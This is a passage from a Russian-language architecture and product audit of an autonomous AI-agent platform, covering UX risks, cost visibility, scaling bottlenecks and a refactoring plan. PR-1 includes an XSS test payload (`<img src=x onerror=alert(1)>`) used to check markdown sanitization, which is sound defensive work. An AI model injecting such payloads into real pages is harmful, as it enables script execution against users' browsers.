  сессии (§14, коммит `5790235`), но сам факт, что это было возможно на
  реальном прогоне, а не в гипотетическом сценарии — прямая иллюстрация
  риска "продукт выглядит неуправляемым" в первые же минуты знакомства.
- Дизайн-направление выбрано агентом молча, без единого вопроса
  владельцу — исправлено (программный гейт).
- Принятая владельцем инициатива («автообновление курса USD/RUB»)
  формально добавлена в план, но реально никогда не была выполнена за
  весь прогон — владелец получил подтверждение "принято", но не получил
  результат и не получил объяснения задержки.

Для **activation** (первое впечатление формирует, останется ли
пользователь) это критично: первый реальный прогон — тот самый момент,
когда демонстрируется автономность продукта, и именно там она выглядела
как хаос, а не как контролируемая работа команды.

### 9.3 Асимметрия "плачу — вижу; ценность — не вижу"

Индикатор расхода токенов (💸 в TopBar) обновляется в реальном времени —
пользователь видит трату денег немедленно. Встречной немедленной обратной
связи о created value (что конкретно сделано, ради чего эта трата) в
такой же немедленной форме нет — Morning Digest даёт сводку, но это
периодический, не real-time сигнал. Асимметрия "вижу расход — не вижу
ценность синхронно" — риск для retention: продукт субъективно ощущается
дороже, чем полезнее, особенно в первые часы использования.

*Решение:* привязать каждый значимый LLM-вызов/трату к видимому
артефакту в UI синхронно (не только в логах/трейсе) — например,
всплывающий toast "потрачено $0.003 → написан офер для лендинга" рядом с
индикатором расхода, а не разнесённые по разным местам интерфейса
сигналы.

### 9.4 Бизнес-цель показывает 0/10 при формально закрытой задаче

Из аудита acceptance-слоя: задача с артефактом "site" может пройти
приёмку с warning "цель ещё не достигнута (Заявки с сайта в неделю:
0.0/10.0)" — это архитектурно верно (L4 Business — informational, не
gate, по BOS §8), но **с точки зрения продукта** владелец видит "✅
Задача выполнена" одновременно с "цель не достигнута" — если это
не объяснено в UI явно и заметно (не только в trace/логах, которые
владелец не читает), создаётся ощущение, что система сама себе
противоречит.

*Решение:* в карточке проекта/задачи в UI — явный визуальный статус,
отличающий "сдано (build/functional прошли)" от "цель достигнута
(business level ok)" — два разных индикатора, не один зелёный чек.
Сложность: **S**, фронтенд-задача поверх уже существующих данных
(`acceptance.levels.business` уже приходит с бэкенда).

## 10. ЧАСТЬ 9 — Масштабирование: что ломается на каждом рубеже

| Рубеж | Что ломается первым | Почему |
|---|---|---|
| **100 пользователей** | Ничего критичного | Один процесс справляется, диск и SQLite не насыщены |
| **10 000 пользователей** | Единый event loop (§2.3) + SQLite-lock (§2.2) | Офис-циклы не успевают обойти всех тенантов за интервал; запись сериализуется через один mutex |
| **100 000 пользователей** | Невозможность multi-worker (§2.1) | Нельзя добавить машины — весь rate-limit/state/questions в RAM одного процесса; `data/tenants/` — сотни тысяч директорий на одном диске |
| **1,000,000+ пользователей** | Всё вышеперечисленное, усугублённое | Без переписывания §2.1–2.2 разговор нерелевантен — упадёт значительно раньше этой отметки |

**Что нужно переделать заранее, а не после первого инцидента:**
durable-очередь офис-задач + Redis (locks/pub-sub/rate-limit/questions) +
Postgres как SSOT + объектное хранилище для файлов workspace/сайтов. Это
не оптимизация под нагрузку, а фундамент, без которого расти
некуда — переделывать это *после* первого пожара на проде на порядок
дороже (миграция данных под живой нагрузкой, а не на чистом старте).

## 12. План рефакторинга — независимые PR (первая волна)

Каждый PR ниже самодостаточен, ревьюится за один проход, не требует,
чтобы другие PR были уже влиты. Порядок внутри волны — по цене/риску,
не по номеру.

### PR-1 — «Sanitize LLM-markdown»

- **Цель:** закрыть XSS-вектор через нерасанированный markdown (§4.2).
- **Файлы:** `webapp/package.json` (+`dompurify`, `+@types/dompurify`),
  `webapp/src/app/views/FileExplorer.tsx`.
- **Последовательность:** добавить зависимость → обернуть `marked.parse`
  в `DOMPurify.sanitize` → пересобрать бандл.
- **Критерий готовности:** `<img src=x onerror=alert(1)>` в тестовом
  `.md`-файле рендерится как текст/пустое изображение, не исполняет JS.
- **Риски:** DOMPurify может срезать легитимную markdown-разметку
  (например, `<details>`/`<summary>`, если агенты их используют) —
  проверить на реальных существующих `.md`-файлах тенантов перед мержем.
- **Проверка:** ручной XSS-payload в `offer.md` через workspace API +
  визуальная проверка вкладки «Папки»; regression-проверка существующих

### PR-2 — «Опасная комбинация флагов — hard-fail при старте»

## 13. Что зафиксировать как открытые решения, не блокирующие текущую работу

Список ниже — сознательно отложенные вопросы, не требующие решения
прямо сейчас, но которые должны быть в поле зрения при планировании
следующих кварталов:

- Формат очереди офис-задач при переходе от §2.1: Redis Streams vs
  Postgres `SKIP LOCKED` vs Temporal — выбор зависит от того, насколько
  сложным становится workflow (Temporal избыточен для простого
  тик-based цикла, но даёт durable retry "из коробки" — стоит
  пересмотреть решение, когда появится реальная нагрузка для замера).
- Мультирегиональность — не актуальна до появления клиентов вне одного
  региона; не проектировать заранее сверх того, что даёт Postgres/S3
  сами по себе (избегать premature distributed-systems сложности).
- Уровень изоляции песочницы исполнения кода (Docker vs gVisor vs
  Firecracker) — решение зависит от риск-аппетита продукта: если
  execute_code остаётся редкой опциональной фичей для доверенных
  клиентов, Docker с базовой изоляцией может быть временно достаточен;
  если это core-фича автономности (которой продукт себя позиционирует),
  нужна серьёзная изоляция с первого дня массового включения.
